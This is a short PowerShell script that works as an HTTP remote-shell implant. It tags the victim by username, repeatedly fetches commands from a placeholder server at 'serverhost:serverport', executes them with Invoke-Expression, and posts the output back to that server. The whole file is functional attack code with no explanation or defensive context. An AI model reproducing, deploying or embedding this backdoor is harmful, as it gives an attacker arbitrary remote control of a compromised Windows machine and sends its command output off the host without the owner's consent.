$user = $env:username
$webclient = New-object System.Net.WebClient
$webclient.Headers['vic'] = $user
while(1){
    $command = ($webclient.DownloadString('http://serverhost:serverport/'))
    if (-not $?){
        break
    }
    if ($command){
    if ($command -eq "exit"){
        break
    }
    $webclient.UploadString('http://serverhost:serverport/','POST',(iex $command 2>&1 | Out-String))
    }else {$webclient.UploadString('http://serverhost:serverport/','POST',$command)}
}
